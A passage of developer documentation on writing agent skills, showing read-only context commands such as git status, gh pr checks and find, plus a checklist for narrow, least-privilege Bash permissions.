Use `find` for file/directory discovery (succeeds with empty output when no matches):

```markdown
## Context

- Git status: !`git status --porcelain=v2 --branch`
- PR checks: !`gh pr checks $PR_NUMBER --json name,state,conclusion`
- Current branch: !`git branch --show-current`
- Config exists: !`test -f .config.json`
- Workflows: !`find .github/workflows -maxdepth 1 -name '*.yml'`
- Directories: !`find . -maxdepth 1 -type d \( -name 'src' -o -name 'lib' \)`
- Config files: !`find . -maxdepth 1 \( -name '*.config.js' -o -name '*.config.ts' \)`
```

### Handling Missing Context

- Commands that fail produce empty output — no error suppression needed
- Check for empty values before using them
- Provide defaults in the command logic
- Use existence checks (`test -f`, `test -d`) for boolean context

## Checklist for New Skills

- [ ] Lists narrow `Bash(<command> *)` patterns for the commands the skill runs, never a bare `Bash`; omits `Bash` entirely when the skill runs no shell
- [ ] Shell utility operations (`test`, `jq`, `find`, `cp`, `mkdir`) live in bundled scripts, each pre-approved by a rule anchored to `${CLAUDE_SKILL_DIR}`
- [ ] Context commands use JSON/porcelain output
- [ ] Context commands contain no shell operators (`>`, `|`, `||`, `&&`, `;`)
- [ ] Context commands use `find` for file/directory discovery
- [ ] Only necessary permissions are granted
- [ ] Matches a standard permission set or documents why custom set is needed


